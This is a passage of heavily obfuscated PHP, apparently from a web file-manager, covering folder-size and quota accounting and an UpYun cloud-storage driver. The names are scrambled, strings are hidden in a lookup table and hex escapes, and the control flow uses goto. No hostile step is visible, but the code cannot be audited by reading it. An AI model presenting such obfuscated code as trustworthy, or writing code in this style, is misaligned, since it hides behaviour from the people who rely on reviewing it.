trim($Å™îÈ³ô, $ÊË¡¢õ«[8])); $ãÃ‹Ë—¾ = intval($±şÃ µõ); foreach ($«¯ñù¸Ç as $š‹ßºµ«) { $ª•ô•Ì = array($ÊË¡¢õ«[191] => $ãÃ‹Ë—¾, $ÊË¡¢õ«[32] => $š‹ßºµ«); $Î¤Ú‰ãƒ = $this->field($ÊË¡¢õ«[2449])->where($ª•ô•Ì)->select(); if (!$Î¤Ú‰ãƒ) { return !1; } $Î¤Ú‰ãƒ = array_sort_by($Î¤Ú‰ãƒ, $ÊË¡¢õ«[527]); $ãÃ‹Ë—¾ = intval($Î¤Ú‰ãƒ[0][$ÊË¡¢õ«[192]]); } $¿®²³ö¨ = $this->sourceInfo($ãÃ‹Ë—¾); $this->pathInfoFilter($¿®²³ö¨); return $¿®²³ö¨; } protected function updateModifyTime($©¿óäç) { $­©¿Ò€ =& $_SERVER[€ä¾™²]; $½«â€Ìµ = KodUser::id(); if (!$©¿óäç) { return; } if (!is_array($©¿óäç)) { $©¿óäç = array($©¿óäç); } foreach ($©¿óäç as $ş÷¤åÛ¢ => $¼šéä†) { $©¿óäç[$ş÷¤åÛ¢] = intval($¼šéä†); $this->sourceCacheClear($¼šéä†); } $Î¾íÁúÂ = array($­©¿Ò€[192] => array($­©¿Ò€[7], $©¿óäç)); $–Œöö¼½ = array($­©¿Ò€[680] => $½«â€Ìµ, $­©¿Ò€[520] => time()); $this->where($Î¾íÁúÂ)->save($–Œöö¼½); } public function folderSizeReset($Âæ»öÒÄ, $øñÑëÔ† = false) { $¹¼¶ÚÍì =& $_SERVER[€ä¾™²]; if ($this->statusIgnoreResetSpace) { return; } if (!$Âæ»öÒÄ) { return; } $…ş‘™ÈÚ = $this->sourceInfo($Âæ»öÒÄ); $‹“úĞğ¤ = $¹¼¶ÚÍì[2450] . $Âæ»öÒÄ; if (!$…ş‘™ÈÚ || !$…ş‘™ÈÚ[$¹¼¶ÚÍì[192]]) { return; } CacheLock::lock($‹“úĞğ¤, 20); if ($øñÑëÔ† === !1) { $this->sourceCacheClear($Âæ»öÒÄ); $…ş‘™ÈÚ = $this->sourceInfo($Âæ»öÒÄ); $³Áì°Æ÷ = array($¹¼¶ÚÍì[499] => $Âæ»öÒÄ, $¹¼¶ÚÍì[526] => 0); $„¨óÊÉ’ = $this->where($³Áì°Æ÷)->sum($¹¼¶ÚÍì[79]); $øñÑëÔ† = intval($„¨óÊÉ’) - intval($…ş‘™ÈÚ[$¹¼¶ÚÍì[79]]); } if ($øñÑëÔ† == 0) { return CacheLock::unlock($‹“úĞğ¤); } $Ù…‡±Å = $this->parentLevelArray($…ş‘™ÈÚ[$¹¼¶ÚÍì[611]]); if (!$Ù…‡±Å) { $Ù…‡±Å = array(); } $Ù…‡±Å[] = $…ş‘™ÈÚ[$¹¼¶ÚÍì[192]]; $³Áì°Æ÷ = array($¹¼¶ÚÍì[192] => array($¹¼¶ÚÍì[514], $Ù…‡±Å)); if ($øñÑëÔ† < 0) { $³Áì°Æ÷[$¹¼¶ÚÍì[79]] = array($¹¼¶ÚÍì[1128], abs($øñÑëÔ†)); } $this->where($³Áì°Æ÷)->setAdd($¹¼¶ÚÍì[79], $øñÑëÔ†); CacheLock::unlock($‹“úĞğ¤); if (!$…ş‘™ÈÚ[$¹¼¶ÚÍì[596]] || $…ş‘™ÈÚ[$¹¼¶ÚÍì[596]] == $¹¼¶ÚÍì[229]) { return; } $ØÅ×Æˆß = $¹¼¶ÚÍì[2451] . $…ş‘™ÈÚ[$¹¼¶ÚÍì[189]] . $¹¼¶ÚÍì[4] . $…ş‘™ÈÚ[$¹¼¶ÚÍì[596]]; $“”š×°Ô = array($…ş‘™ÈÚ[$¹¼¶ÚÍì[189]], $…ş‘™ÈÚ[$¹¼¶ÚÍì[596]]); TaskRun::timeLimitCall($ØÅ×Æˆß, $¹¼¶ÚÍì[2452], $“”š×°Ô, 1.5); } public function folderSizeResetChildren($äéåĞ®¨) { $ˆÌšòÓ =& $_SERVER[€ä¾™²]; $this->sourceCacheClear($äéåĞ®¨); $ÄÆëƒåô = $this->sourceInfo($äéåĞ®¨); if (!$ÄÆëƒåô) { return; } $Úç’ÉéÊ = array($ˆÌšòÓ[675] => 1, $ˆÌšòÓ[678] => $ÄÆëƒåô[$ˆÌšòÓ[596]], $ˆÌšòÓ[681] => array($ˆÌšòÓ[642], $ÄÆëƒåô[$ˆÌšòÓ[611]] . $äéåĞ®¨ . $ˆÌšòÓ[643])); $×’Ÿ÷¢Ÿ = $ˆÌšòÓ[2453]; $¹¤´ÜƒÃ = $this->field($×’Ÿ÷¢Ÿ)->where($Úç’ÉéÊ)->select(); $Úç’ÉéÊ[$ˆÌšòÓ[507]] = 0; $şÇâ…Úå = $this->field($×’Ÿ÷¢Ÿ)->where($Úç’ÉéÊ)->select(); if (!$şÇâ…Úå) { return; } $¹¤´ÜƒÃ[] = $ÄÆëƒåô; $¹¤´ÜƒÃ = array_to_keyvalue($¹¤´ÜƒÃ, $ˆÌšòÓ[192]); foreach ($¹¤´ÜƒÃ as $½úÚ¨”Ó => $ÖÛ–§úå) { $¹¤´ÜƒÃ[$½úÚ¨”Ó][$ˆÌšòÓ[2454]] = $¹¤´ÜƒÃ[$½úÚ¨”Ó][$ˆÌšòÓ[79]]; $¹¤´ÜƒÃ[$½úÚ¨”Ó][$ˆÌšòÓ[79]] = 0; } foreach ($şÇâ…Úå as $ÖÛ–§úå) { $î’ò‰¡È = $ÖÛ–§úå[$ˆÌšòÓ[191]] . $ˆÌšòÓ[12]; if (!isset($¹¤´ÜƒÃ[$î’ò‰¡È])) { continue; } if ($ÖÛ–§úå[$ˆÌšòÓ[527]] == $¹¤´ÜƒÃ[$î’ò‰¡È][$ˆÌšòÓ[527]]) { $¹¤´ÜƒÃ[$î’ò‰¡È][$ˆÌšòÓ[79]] += $ÖÛ–§úå[$ˆÌšòÓ[79]]; } } foreach ($¹¤´ÜƒÃ as $ÖÛ–§úå) { $ğ£Š¶û = $this->parentLevelArray($ÖÛ–§úå[$ˆÌšòÓ[611]]); foreach ($ğ£Š¶û as $î’ò‰¡È) { $î’ò‰¡È = $î’ò‰¡È . $ˆÌšòÓ[12]; if (!isset($¹¤´ÜƒÃ[$î’ò‰¡È])) { continue; } if ($ÖÛ–§úå[$ˆÌšòÓ[527]] == $¹¤´ÜƒÃ[$î’ò‰¡È][$ˆÌšòÓ[527]]) { $¹¤´ÜƒÃ[$î’ò‰¡È][$ˆÌšòÓ[79]] += $ÖÛ–§úå[$ˆÌšòÓ[79]]; } } } $±ŸÒİıİ = array(); foreach ($¹¤´ÜƒÃ as $ÖÛ–§úå) { if ($ÖÛ–§úå[$ˆÌšòÓ[79]] == $ÖÛ–§úå[$ˆÌšòÓ[2454]]) { continue; } $±ŸÒİıİ[] = array($ˆÌšòÓ[192], $ÖÛ–§úå[$ˆÌšòÓ[192]], $ˆÌšòÓ[79], $ÖÛ–§úå[$ˆÌšòÓ[79]]); } $this->saveAll($±ŸÒİıİ); } public function userSpaceReset($ í¡÷„Á = false) { $Çú—ÅÔ“ =& $_SERVER[€ä¾™²]; $ŠÃ²ˆö‹ = $this->where(array($Çú—ÅÔ“[189] => self::TYPE_USER, $Çú—ÅÔ“[596] => $ í¡÷„Á, $Çú—ÅÔ“[507] => 0))->sum($Çú—ÅÔ“[79]); $ŠÃ²ˆö‹ = !$ŠÃ²ˆö‹ || $ŠÃ²ˆö‹ <= 0 ? 0 : $ŠÃ²ˆö‹; Model($Çú—ÅÔ“[604])->userEdit($ í¡÷„Á, array($Çú—ÅÔ“[2117] => $ŠÃ²ˆö‹)); } public function targetSpaceUpdate($Ì¾àïµÙ, $æıÍÜ½Š) { $çî‚¦ÄĞ =& $_SERVER[€ä¾™²]; if (!$æıÍÜ½Š) { return; } if (!in_array($Ì¾àïµÙ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $é…µ¹¨Œ = $this->targetSpaceSize($Ì¾àïµÙ, $æıÍÜ½Š); if ($Ì¾àïµÙ == self::TYPE_USER) { Model($çî‚¦ÄĞ[604])->userEdit($æıÍÜ½Š, array($çî‚¦ÄĞ[2117] => $é…µ¹¨Œ)); } else { if ($Ì¾àïµÙ == self::TYPE_GROUP) { Model($çî‚¦ÄĞ[612])->groupEdit($æıÍÜ½Š, array($çî‚¦ÄĞ[2117] => $é…µ¹¨Œ)); } } } public function targetSpaceSize($…”ğšíİ, $ªÕ·§âº) { $ğ¶ù¶÷¦ =& $_SERVER[€ä¾™²]; $¦öŠ×Ã® = 0; $Ë¦¯üİ = $this->targetSourceRoot($…”ğšíİ, $ªÕ·§âº, !0); foreach ($Ë¦¯üİ as $‚İÉÏ‘) { if (!$‚İÉÏ‘) { continue; } $¦öŠ×Ã® += floatval($‚İÉÏ‘[$ğ¶ù¶÷¦[79]]); $–Á¯“°– = array($ğ¶ù¶÷¦[681] => array($ğ¶ù¶÷¦[642], $ğ¶ù¶÷¦[620] . $‚İÉÏ‘[$ğ¶ù¶÷¦[192]] . $ğ¶ù¶÷¦[643])); $™Ö›ÂÓ– = Model($ğ¶ù¶÷¦[525])->field($ğ¶ù¶÷¦[513])->where($–Á¯“°–)->select(); $™Ö›ÂÓ– = array_to_keyvalue($™Ö›ÂÓ–, $ğ¶ù¶÷¦[12], $ğ¶ù¶÷¦[192]); $™Ö›ÂÓ– = array_unique(array_filter($™Ö›ÂÓ–)); if ($™Ö›ÂÓ–) { $–Á¯“°– = array($ğ¶ù¶÷¦[513] => array($ğ¶ù¶÷¦[514], $™Ö›ÂÓ–)); $¦öŠ×Ã® += floatval($this->where($–Á¯“°–)->sum($ğ¶ù¶÷¦[79])); } } $¦öŠ×Ã® = !$¦öŠ×Ã® || $¦öŠ×Ã® <= 0 ? 0 : $¦öŠ×Ã®; return $¦öŠ×Ã®; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($™¸’ëå…) { return $this->fileTypeProfile($™¸’ëå…, SourceModel::TYPE_USER); } public function groupFileTypeProfile($×®ıªá§) { return $this->fileTypeProfile($×®ıªá§, SourceModel::TYPE_GROUP); } private function fileTypeProfile($£Şµ¸ë, $Â˜¼ıâ) { $ÏÉ®Š§˜ =& $_SERVER[€ä¾™²]; $ëú“ğª‡ = $ÏÉ®Š§˜[2455] . $£Şµ¸ë . $ÏÉ®Š§˜[11] . $Â˜¼ıâ; $ıÜüŸÂÕ = Cache::get($ëú“ğª‡); if ($ıÜüŸÂÕ) { return $ıÜüŸÂÕ; } $œÈ¼¨Ù“ = array($ÏÉ®Š§˜[675] => 0); if ($£Şµ¸ë != !1) { $œÈ¼¨Ù“[$ÏÉ®Š§˜[596]] = $£Şµ¸ë; $œÈ¼¨Ù“[$ÏÉ®Š§˜[189]] = $Â˜¼ıâ; } $‚´™¾ô© = array(); $†ß¼æ‚ = $this->field(array($ÏÉ®Š§˜[2380] => $ÏÉ®Š§˜[2084], $ÏÉ®Š§˜[2456] => $ÏÉ®Š§˜[79]))->where($œÈ¼¨Ù“)->find(); $‚´™¾ô©[$ÏÉ®Š§˜[2457]] = array($ÏÉ®Š§˜[2458] => LNG($ÏÉ®Š§˜[2457]), $ÏÉ®Š§˜[2459] => intval($†ß¼æ‚[$ÏÉ®Š§˜[2084]]), $ÏÉ®Š§˜[647] => intval($†ß¼æ‚[$ÏÉ®Š§˜[79]])); $£¼åÈ­— = KodIO::fileTypeList(); foreach ($£¼åÈ­— as $Õ¶îÄâ => $ñ¢öù¼Ğ) { $œÈ¼¨Ù“[$ÏÉ®Š§˜[508]] = $this->fileTypeWhere($Õ¶îÄâ); $†ß¼æ‚ = $this->field(array($ÏÉ®Š§˜[2380] => $ÏÉ®Š§˜[2084], $ÏÉ®Š§˜[2456] => $ÏÉ®Š§˜[79]))->where($œÈ¼¨Ù“)->find(); $‚´™¾ô©[$Õ¶îÄâ] = array($ÏÉ®Š§˜[2458] => $ñ¢öù¼Ğ[$ÏÉ®Š§˜[32]], $ÏÉ®Š§˜[2459] => intval($†ß¼æ‚[$ÏÉ®Š§˜[2084]]), $ÏÉ®Š§˜[647] => intval($†ß¼æ‚[$ÏÉ®Š§˜[79]])); } Cache::set($ëú“ğª‡, $‚´™¾ô©, 1200); return $‚´™¾ô©; } public function fileNameExist($×…âØ‹š, $·‰ô‰õé) { $¥…í×±õ =& $_SERVER[€ä¾™²]; $”ê†“  = $this->field($¥…í×±õ[2460])->where(array($¥…í×±õ[191] => $×…âØ‹š, $¥…í×±õ[32] => $·‰ô‰õé, $¥…í×±õ[527] => 0))->find(); return is_array($”ê†“ ) ? $”ê†“ [$¥…í×±õ[192]] : !1; } public function childList($Ìƒ §‹) { $€ÇóüùÍ =& $_SERVER[€ä¾™²]; $‡‘¡Ò‡” = $€ÇóüùÍ[2430] . $Ìƒ §‹; if (isset(self::$cacheChildList[$‡‘¡Ò‡”])) { return self::$cacheChildList[$‡‘¡Ò‡”]; } $ğ÷÷äßŞ = array($€ÇóüùÍ[191] => intval($Ìƒ §‹), $€ÇóüùÍ[527] => 0); $ÙãÈ‚ÇÎ = $this->where($ğ÷÷äßŞ)->select(); $ÙãÈ‚ÇÎ = $ÙãÈ‚ÇÎ ? $ÙãÈ‚ÇÎ : array(); self::$cacheChildList[$‡‘¡Ò‡”] = $ÙãÈ‚ÇÎ; foreach ($ÙãÈ‚ÇÎ as $•¿ÑÁÛÓ) { $‡‘¡Ò‡” = $€ÇóüùÍ[554] . $•¿ÑÁÛÓ[$€ÇóüùÍ[192]]; self::$cacheSourceInfo[$‡‘¡Ò‡”] = $•¿ÑÁÛÓ; } return $ÙãÈ‚ÇÎ; } public function fileNameAuto($ÕÁşùåä, $î‹à¬†, $öÆÁ€Î® = REPEAT_RENAME, $­Ï©ØÀ  = false) { $·æ’Å· =& $_SERVER[€ä¾™²]; $¾´Ôâ•Å = get_path_ext($î‹à¬†); $²Å¢ÕúÀ = $¾´Ôâ•Å ? get_path_ext_name($î‹à¬†) . $·æ’Å·[2461] . $¾´Ôâ•Å : $î‹à¬† . $·æ’Å·[474]; $ï¤¹ß¬Ê = array($·æ’Å·[191] => $ÕÁşùåä, $·æ’Å·[527] => 0, $·æ’Å·[32] => array($·æ’Å·[473], $²Å¢ÕúÀ)); $üÒ´«ˆò = $this->field($·æ’Å·[32])->where($ï¤¹ß¬Ê)->select(); $‘öÃÏĞæ = array_to_keyvalue($üÒ´«ˆò, $·æ’Å·[12], $·æ’Å·[32]); return $this->fileNameAutoGet($‘öÃÏĞæ, $î‹à¬†, $öÆÁ€Î®, $­Ï©ØÀ ); } public function fileNameAutoGet($ï¢¤ß—´, $£‡—¤Á´, $Ñâ´’´, $Ç†ø±ª›) { $ÑğöÅ =& $_SERVER[€ä¾™²]; if ($Ñâ´’´ == REPEAT_REPLACE || !$ï¢¤ß—´ || !in_array_not_case($£‡—¤Á´, $ï¢¤ß—´) || $Ç†ø±ª› && $Ñâ´’´ != REPEAT_RENAME_FOLDER) { return $£‡—¤Á´; } if ($Ñâ´’´ == REPEAT_SKIP) { return !1; } $¯‘ÜŸ¿² = $ÑğöÅ[10] . get_path_ext($£‡—¤Á´); $¯‘ÜŸ¿² = $¯‘ÜŸ¿² == $ÑğöÅ[10] || $Ç†ø±ª› ? $ÑğöÅ[12] : $¯‘ÜŸ¿²; for ($¸¾Ü„¯Â = 1; $¸¾Ü„¯Â <= count($ï¢¤ß—´) + 1; $¸¾Ü„¯Â++) { $ĞğØãÆê = substr($£‡—¤Á´, 0, strlen($£‡—¤Á´) - strlen($¯‘ÜŸ¿²)); $›É¨ºÎ¶ = $ĞğØãÆê . "\x28{$¸¾Ü„¯Â}\x29{$¯‘ÜŸ¿²}"; if (!in_array_not_case($›É¨ºÎ¶, $ï¢¤ß—´)) { return $›É¨ºÎ¶; } } } } goto dĞ‚Ñ•ô‘º; FîÊ¶Úéé: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($…îğÍ¸’, $ş›Œ‚ı† = 0) { parent::__construct(); $this->source = $…îğÍ¸’; $this->sourceSize = $ş›Œ‚ı†; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ë•×ê³ = false) { return $this->sourceSize; } public function getContent($ÖÃ‚Öè‹ = false) { return $this->fileSubstr($ÖÃ‚Öè‹, 0, $this->sourceSize); } public function fileSubstr($ÛÑ½º¼é = false, $®¶äÀ‘“ = 0, $å×ı´“ş = 0) { if (!$å×ı´“ş) { $å×ı´“ş = $this->sourceSize; } $„ÍÊòŞõ = $this->sourceSize - $®¶äÀ‘“; if ($å×ı´“ş >= $„ÍÊòŞõ) { $å×ı´“ş = $„ÍÊòŞõ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $®¶äÀ‘“, $å×ı´“ş); } if ($this->sourceType == self::TYPE_FILE) { if ($å×ı´“ş <= 0) { return $_SERVER[€ä¾™²][12]; } $¯„ÚñÎ = ftell($this->source); fseek_64($this->source, $¯„ÚñÎ + $®¶äÀ‘“); $¥çÖœˆ  = @fread($this->source, $å×ı´“ş); fseek_64($this->source, $¯„ÚñÎ); return $¥çÖœˆ ; } } public function hashMd5($şç‚É» = false) { return md5($this->getContent()); } public static function hash($œı½â×Ñ, $°š²¢Öš = 0) { $õ¿ÙªÚ­ = new PathDriverStream($œı½â×Ñ, $°š²¢Öš); return $õ¿ÙªÚ­->hashSimple($œı½â×Ñ); } public static function md5($ê ŠÎåÎ, $Ù€¼Ñ¤è = 0) { $ûİÎÁõÄ = new PathDriverStream($ê ŠÎåÎ, $Ù€¼Ñ¤è); return $ûİÎÁõÄ->hashMd5($ê ŠÎåÎ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\57\x2f\x76\60\56\x61\x70\x69\56\165\x70\171\x75\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($§ŸÃŠ) { parent::__construct(); $this->_init($§ŸÃŠ); } public function _init($µ¨¶”ù) { $ïÜë¼¶¢ =& $_SERVER[€ä¾™²]; foreach ($µ¨¶”ù as $şóğ•ä± => $‚¿¿Óç) { if (isset($this->{$şóğ•ä±})) { $this->{$şóğ•ä±} = $‚¿¿Óç; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ïÜë¼¶¢[1695] . LNG($ïÜë¼¶¢[1618])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($…·ÛµõŞ, $õ©½¯š« = "\x47\x45\124") { $ü‡ˆşˆ =& $_SERVER[€ä¾™²]; $‚šûæ  = gmdate($ü‡ˆşˆ[1647]); $Ñ—Ô´àÊ = base64_encode(hash_hmac($ü‡ˆşˆ[1696], "{$õ©½¯š«}\46{$…·ÛµõŞ}\46{$‚šûæ }", md5("{$this->userpass}"), !0)); $ñî•¢¢˜ = array("\x41\165\x74\x68\157\162\x69\172\x61\x74\151\157\156\x3a\125\x50\x59\125\x4e\40{$this->username}\x3a{$Ñ—Ô´àÊ}", "\104\x61\x74\x65\72{$‚šûæ }"); return $ñî•¢¢˜; } public function ussRequest($³Ê¶ß¶Ğ, $š÷Û•˜Ï = "\x47\105\x54", $ßáûñ‡° = false, $ÔÔÎ‘ïù = false, $èßãõ — = false) { $‚öÕÖ¢¯ =& $_SERVER[€ä¾™²]; $³Ê¶ß¶Ğ = trim($³Ê¶ß¶Ğ, $‚öÕÖ¢¯[8]); $µÅÈ”—¿ = "\x2f{$this->bucket}\57" . rawurlencode($³Ê¶ß¶Ğ); $´±›° = $this->ussHeaders($µÅÈ”—¿, $š÷Û•˜Ï); if ($ÔÔÎ‘ïù) { $´±›° = array_merge($´±›°, $ÔÔÎ‘ïù); } $Ğ×“Ú” = url_request($this->endpoint . $µÅÈ”—¿, $š÷Û•˜Ï, $ßáûñ‡°, $´±›°, $èßãõ —); if (!$Ğ×“Ú”) { $äŸü˜­Ù = LNG($‚öÕÖ¢¯[1697]); $this->writeLog($äŸü˜­Ù); return array($‚öÕÖ¢¯[1346] => !1, $‚öÕÖ¢¯[1336] => $äŸü˜­Ù); } if (strtolower($š÷Û•˜Ï) == $‚öÕÖ¢¯[228] || in_array($Ğ×“Ú”[$‚öÕÖ¢¯[1346]], array($‚öÕÖ¢¯[262], $‚öÕÖ¢¯[1698]))) { $ßáûñ‡° = $Ğ×“Ú”[$‚öÕÖ¢¯[1699]]; if (!$Ğ×“Ú”[$‚öÕÖ¢¯[850]]) { $ßáûñ‡° = isset($ßáûñ‡°[0]) ? $ßáûñ‡°[0] : $‚öÕÖ¢¯[12]; } } else { $ßáûñ‡° = json_decode($Ğ×“Ú”[$‚öÕÖ¢¯[1336]], !0); if (!$ßáûñ‡°) { $ßáûñ‡° = $Ğ×“Ú”[$‚öÕÖ¢¯[1336]]; } else { if (!$Ğ×“Ú”[$‚öÕÖ¢¯[850]] && isset($ßáûñ‡°[$‚öÕÖ¢¯[1700]])) { $ßáûñ‡° = $ßáûñ‡°[$‚öÕÖ¢¯[1700]]; } } } if (!$Ğ×“Ú”[$‚öÕÖ¢¯[850]]) { $this->writeLog($this->__errorMessage($ßáûñ‡°)); } return array($‚öÕÖ¢¯[1346] => $Ğ×“Ú”[$‚öÕÖ¢¯[850]], $‚öÕÖ¢¯[1336] => $ßáûñ‡°); } private function __errorMessage($ıçµá×ş) { $Ö¥†ß°£ =& $_SERVER[€ä¾™²]; if (!$ıçµá×ş) { return $Ö¥†ß°£[12]; } static $şàÏÌ–Â = null; if (!$şàÏÌ–Â) { $şàÏÌ–Â = I18n::getType(); } if ($şàÏÌ–Â != $Ö¥†ß°£[1655]) { return $ıçµá×ş; } $½˜åºé = array($Ö¥†ß°£[1701] => $Ö¥†ß°£[1702], $Ö¥†ß°£[1703] => $Ö¥†ß°£[1704], $Ö¥†ß°£[1705] => $Ö¥†ß°£[1704], $Ö¥†ß°£[1706] => $Ö¥†ß°£[1707], $Ö¥†ß°£[1708] => $Ö¥†ß°£[1709], $Ö¥†ß°£[1710] => $Ö¥†ß°£[1711], $Ö¥†ß°£[1712] => $Ö¥†ß°£[1713]); return isset($½˜åºé[$ıçµá×ş]) ? $½˜åºé[$ıçµá×ş] : $ıçµá×ş; } public function mkfile($ŸõÇÈ–Õ, $˜‘–Òàˆ = '', $ò×º°´Ë = REPEAT_RENAME) { if ($this->setContent($ŸõÇÈ–Õ, $˜‘–Òàˆ)) { return $this->getPathOuter($ŸõÇÈ–Õ); } return !1; } public function mkdir($Ûû€½ÏÜ, $¶óş—€ë = REPEAT_SKIP) { $–˜ã×¥Í =& $_SERVER[€ä¾™²]; $ˆ­¶¢ú = trim($Ûû€½ÏÜ, $–˜ã×¥Í[8]); if ($this->_isFolder($ˆ­¶¢ú)) { return $this->getPathOuter($ˆ­¶¢ú); } $å¨˜©—¸ = array($–˜ã×¥Í[1714]); $Šå’ôŸü = $this->ussRequest($ˆ­¶¢ú, $–˜ã×¥Í[289], !1, $å¨˜©—¸); return $Šå’ôŸü[$–˜ã×¥Í[1346]] ? $this->getPathOuter($ˆ­¶¢ú) : !1; } public function copyFile($³Á½úìÖ, $˜„ê´†Ò) { $öÜËÁ÷ç =& $_SERVER[€ä¾™²]; $éïè—Àù = array($öÜËÁ÷ç[1715] . "\x2f{$this->bucket}\57{$³Á½úìÖ}", $öÜËÁ÷ç[1716]); $·¦•äñå = $this->ussRequest($˜„ê´†Ò, $öÜËÁ÷ç[254], !1, $éïè—Àù); return $·¦•äñå[$öÜËÁ÷ç[1346]] ? !0 : $this->getPathOuter($˜„ê´†Ò); } public function moveFile($ášÑÑ©“, $¶±‚Àíœ) { $”ç¼…±ë =& $_SERVER[€ä¾™²]; $ÒóÜÂÉÒ = array($”ç¼…±ë[1717] . "\57{$this->bucket}\x2f{$ášÑÑ©“}", $”ç¼…±ë[1716]); $«¹Â¸ » = $this->ussRequest($¶±‚Àíœ, $”ç¼…±ë[254], !1, $ÒóÜÂÉÒ); return $«¹Â¸ »[$”ç¼…±ë[1346]] ? !0 : $this->getPathOuter($¶±‚Àíœ); } public function delFile($“ ÃœãŒ) { $Ãğü«Ãü =& $_SERVER[€ä¾™²]; $¾«Ê‘Òİ = $this->ussRequest($“ ÃœãŒ, $Ãğü«Ãü[1718]); return $¾«Ê‘Òİ[$Ãğü«Ãü[1346]] ? !0 : !1; } public function delFolder($åÙêå¡Æ) { $ä¢ê¶¹Š =& $_SERVER[€ä¾™²]; if (!$this->exist($åÙêå¡Æ)) { return !0; } $this->listItemCache = !1; $¾È®Úş = $ã‰şéöè = array(); $this->fileList($åÙêå¡Æ, $¾È®Úş, $ã‰şéöè, !0); $this->listItemCache = !0; foreach ($ã‰şéöè as $ãËŸ‰—Ù) { $‹¡Ú©Ê³ = $this->ussRequest($ãËŸ‰—Ù[$ä¢ê¶¹Š[32]], $ä¢ê¶¹Š[1718]); if (!$‹¡Ú©Ê³[$ä¢ê¶¹Š[1346]]) { return !1; } } usort($¾È®Úş, function ($–ÆâÎæ», $Ÿ———ó) { $À†æÜ¿Á =& $_SERVER[€ä¾™²]; return substr_count($Ÿ———ó, $À†æÜ¿Á[8]) - substr_count($–ÆâÎæ», $À†æÜ¿Á[8]); }); foreach ($¾È®Úş as $è¥„ÜÚº) { $‹¡Ú©Ê³ = $this->ussRequest($è¥„ÜÚº, $ä¢ê¶¹Š[1718]); if (!$‹¡Ú©Ê³[$ä¢ê¶¹Š[1346]]) { return !1; } } $‹¡Ú©Ê³ = $this->ussRequest($åÙêå¡Æ, $ä¢ê¶¹Š[1718]); return $‹¡Ú©Ê³[$ä¢ê¶¹Š[1346]]; } public function rename($ª³Ï÷ÖË, $¡ŠêÆ¿Ó) { if ($this->isFile($ª³Ï÷ÖË)) { $¡ŠêÆ¿Ó = get_path_father($ª³Ï÷ÖË) . $¡ŠêÆ¿Ó; return $this->moveFile($ª³Ï÷ÖË, $¡ŠêÆ¿Ó); } return $this->renameObject($ª³Ï÷ÖË, $¡ŠêÆ¿Ó); } public function fileInfo($˜™Ìô®, $½¯Îûş = false, $Î¾ÂÂ÷‚ = array()) { $å–·üç‚ =& $_SERVER[€ä¾™²]; $ÑâÁÕª° = array($å–·üç‚[32] => $this->pathThis($˜™Ìô®), $å–·üç‚[87] => $this->getPathOuter($å–·üç‚[8] . $˜™Ìô®), $å–·üç‚[33] => $å–·üç‚[231], $å–·üç‚[79] => isset($Î¾ÂÂ÷‚[$å–·üç‚[79]]) ? $Î¾ÂÂ÷‚[$å–·üç‚[79]] : 0, $å–·üç‚[167] => $this->ext($˜™Ìô®)); if ($½¯Îûş) { return $ÑâÁÕª°; } $ÑâÁÕª°[$å–·üç‚[232]] = $ÑâÁÕª°[$å–·üç‚[88]] = 0; $ÑâÁÕª°[$å–·üç‚[233]] = $ÑâÁÕª°[$å–·üç‚[234]] = !0; if (empty($Î¾ÂÂ÷‚)) { $Î¾ÂÂ÷‚ = $this->objectMeta($˜™Ìô®); if (!$Î¾ÂÂ÷‚) { return $ÑâÁÕª°; } } $ÑâÁÕª°[$å–·üç‚[232]] = intval($Î¾ÂÂ÷‚[$å–·üç‚[1719]]); $ÑâÁÕª°[$å–·üç‚[88]] = intval($Î¾ÂÂ÷‚[$å–·üç‚[1720]]); $ÑâÁÕª°[$å–·üç‚[79]] = $Î¾ÂÂ÷‚[$å–·üç‚[79]]; return $ÑâÁÕª°; } public function folderInfo($÷½Á†èÌ, $šÚÎô›œ = false) { $¸Â¸åİ¢ =& $_SERVER[€ä¾™²]; $ôûÃÌÃ = array($¸Â¸åİ¢[32] => $this->pathThis($÷½Á†èÌ), $¸Â¸åİ¢[87] => $this->getPathOuter($¸Â¸åİ¢[8] . $÷½Á†èÌ), $¸Â¸åİ¢[33] => $¸Â¸åİ¢[78]); if ($šÚÎô›œ) { return $ôûÃÌÃ; } $ôûÃÌÃ[$¸Â¸åİ¢[232]] = $ôûÃÌÃ[$¸Â¸åİ¢[88]] = 0; $ôûÃÌÃ[$¸Â¸åİ¢[233]] = $ôûÃÌÃ[$¸Â¸åİ¢[234]] = !0; if (empty($Õ¯Îù¬ï)) { $Õ¯Îù¬ï = $this->objectMeta($÷½Á†èÌ); if (!$Õ¯Îù¬ï) { return $ôûÃÌÃ; } } $ôûÃÌÃ[$¸Â¸åİ¢[232]] = intval($Õ¯Îù¬ï[$¸Â¸åİ¢[1719]]); $ôûÃÌÃ[$¸Â¸åİ¢[88]] = intval($Õ¯Îù¬ï[$¸Â¸åİ¢[1720]]); return $ôûÃÌÃ; } private function listObjs($ü–™†ù, $¸†İÕ÷î = 0, $±¼àİ— = 1000) { $è¿òêğ =& $_SERVER[€ä¾™²]; $Ï÷‰îğã = array($è¿òêğ[1721], $è¿òêğ[1722] . $±¼àİ—); if ($¸†İÕ÷î) { $Ï÷‰îğã[] = $è¿òêğ[1723] . $¸†İÕ÷î; } $€óê¡Ï = $this->ussRequest($ü–™†ù, $è¿òêğ[1552], !1, $Ï÷‰îğã); return !$€óê¡Ï[$è¿òêğ[1346]] ? !1 : $€óê¡Ï[$è¿òêğ[1336]]; } private function fileList($åòï”¥´, &$Åº•–È¯, &$«øô½Àˆ, $Î‚•ÓšÕ = false) { $ƒŞÇ¿ãì =& $_SERVER[€ä¾™²]; $şê½‰’® = $ƒŞÇ¿ãì[12]; $Ë×ìù‡¶ = 1000; $½İ‚ïüı = rtrim($åòï”¥´, $ƒŞÇ¿ãì[8]) . $ƒŞÇ¿ãì[8]; while (!0) { check_abort(); $™†Ô´’É = $this->listObjs($åòï”¥´, $şê½‰’®, 